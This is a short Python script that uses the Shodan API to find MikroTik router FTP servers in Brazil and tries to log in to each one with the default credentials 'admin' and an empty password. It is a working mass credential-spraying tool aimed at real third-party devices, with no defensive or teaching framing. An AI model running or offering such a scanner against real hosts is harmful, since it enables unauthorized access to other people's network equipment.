import ftplib
import shodan
import os

creds = ('admin', '')

api = shodan.Shodan(os.getenv('SHODAN'))

results = api.search('port:"21" country:"BR" product:"MikroTik router ftpd"', page=1, limit=1000, offset=None)

print("[+] Connected Succesfull on Shodan API\n[+] Shodan Search Found: {}\n".format(results["total"]))

for i, hosts in enumerate(results['matches']):
      ipaddress = hosts['ip_str']
      try:
        ftp = ftplib.FTP(ipaddress, *creds)
        ftp.login()
        print(ftp.login())
      except ftplib.error_perm as error:
        print(error)
